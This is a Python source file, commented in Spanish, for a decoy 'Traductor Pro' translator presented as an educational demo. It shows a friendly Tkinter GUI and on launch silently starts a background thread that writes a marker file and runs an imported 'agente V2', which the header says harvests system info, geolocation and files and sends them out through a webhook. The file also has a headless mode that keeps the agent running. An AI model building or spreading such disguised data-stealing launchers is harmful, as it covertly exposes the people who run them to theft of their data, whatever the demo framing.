#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Traductor Pro  ---  DEMO EDUCATIVA - Sag
======================================================
PARA EL EXPOSITOR (esto NO lo ve el usuario que lo descarga):

    Programa señuelo que se presenta como un traductor amigable.
    Por detrás ejecuta acciones "silenciosas" al arrancar:

      1) Escribe un archivo marcador en disco (narrativa de la demo).
      2) Arranca el AGENTE V2, que hace recolección pasiva y exfiltración
         por webhook (info del sistema, geo, archivos, captura selectiva).
"""

import os
import sys
import time
import threading
from pathlib import Path

from agente_v2 import iniciar_en_hilo

APP_NAME = "Traductor Pro"
APP_VERSION = "2.0"

# --- Marcador (narrativa de la demo) -----------------------------------------
if os.name == "nt":
    MARKER_PATH = r"C:\temp\ya_estarias_hackeado.txt"
else:
    MARKER_PATH = "/tmp/ya_estarias_hackeado.txt"

MARKER_TEXT = (
    "Si esto fuera malware real, YA ESTARIAS HACKEADO.\n"
    "Descargaste y ejecutaste un binario sin firmar de un GitHub cualquiera.\n"
    "-- JE -\n"
)


def escribir_marcador() -> str:
    """Escribe el archivo marcador en disco. Benigno: solo un .txt."""
    p = Path(MARKER_PATH)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(MARKER_TEXT, encoding="utf-8")
    return str(p)


# --- Acciones "por atrás" al iniciar -----------------------------------------
def acciones_al_iniciar():
    """Lo que corre 'por detrás' apenas se abre el traductor."""
    time.sleep(1.5)  # dejamos que la ventana aparezca primero
    try:
        escribir_marcador()
    except Exception:
        pass  # una demo nunca debería crashear por esto

    # Arrancar el agente V2 (recolección + exfiltración)
    iniciar_en_hilo()


# --- Mini-diccionario para que el traductor parezca funcional - aca se puede poner cualquier cosa----------------
_MINI = {
    ("hola", "en"): "hello", ("gracias", "en"): "thank you",
    ("adios", "en"): "goodbye", ("buenos dias", "en"): "good morning",
    ("hello", "es"): "hola", ("thank you", "es"): "gracias",
    ("goodbye", "es"): "adios", ("good morning", "es"): "buenos dias",
}


def traducir_texto(text: str, target_lang: str = "en") -> str:
    return _MINI.get((text.strip().lower(), target_lang), f"[{target_lang}] {text}")


# --- Interfaz amigable (lo único que ve el usuario) aca tambien. lo que sea se puede mostrar --------------------------
def start_gui():
    import tkinter as tk
    from tkinter import ttk

    root = tk.Tk()
    root.title(f"{APP_NAME} v{APP_VERSION}")
    root.geometry("560x460")
    root.resizable(False, False)

    tk.Label(root, text="🌐  Traductor Pro", font=("Segoe UI", 18, "bold")).pack(pady=(16, 2))
    tk.Label(root, text="Traducción rápida español ⇄ inglés", font=("Segoe UI", 10)).pack()

    instr = (
        "Cómo usarlo:\n"
        "  1. Escribí una palabra o frase corta abajo.\n"
        "  2. Elegí el idioma de destino.\n"
        "  3. Presioná «Traducir».\n\n"
        "Ejemplos: hola, gracias, buenos días, hello, thank you."
    )
    box = tk.Frame(root, bg="#f0f4f8", bd=1, relief="solid")
    box.pack(fill="x", padx=20, pady=12)
    tk.Label(box, text=instr, justify="left", bg="#f0f4f8",
             font=("Segoe UI", 9)).pack(anchor="w", padx=12, pady=10)

    frm = tk.Frame(root)
    frm.pack(fill="x", padx=20)
    entrada = tk.Entry(frm, font=("Segoe UI", 11))
    entrada.pack(side="left", fill="x", expand=True, ipady=4)
    idioma = ttk.Combobox(frm, values=["en", "es"], width=5, state="readonly")
    idioma.set("en")
    idioma.pack(side="left", padx=(8, 0))

    salida = tk.Label(root, text="", font=("Segoe UI", 13, "bold"), fg="#1a5276")
    salida.pack(pady=16)

    def on_translate():
        txt = entrada.get().strip()
        if txt:
            salida.config(text="→  " + traducir_texto(txt, idioma.get()))

    tk.Button(root, text="Traducir", command=on_translate,
              font=("Segoe UI", 11, "bold"), bg="#2e86c1", fg="white",
              activebackground="#2471a3", relief="flat", padx=20, pady=6).pack()
    entrada.bind("<Return>", lambda e: on_translate())

    tk.Label(root, text=f"Traductor Pro v{APP_VERSION} · offline-ready",
             font=("Segoe UI", 8), fg="#888").pack(side="bottom", pady=8)

    root.mainloop()


def main():
    headless = "--headless" in sys.argv
    # Acciones "por detrás" al iniciar (marcador + agente V2)
    threading.Thread(target=acciones_al_iniciar, daemon=True).start()
    # Interfaz amigable en primer plano
    if headless:
        print(f"[{APP_NAME}] headless: agente V2 activo (Ctrl+C para salir)")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    else:
        start_gui()


if __name__ == "__main__":
    main()
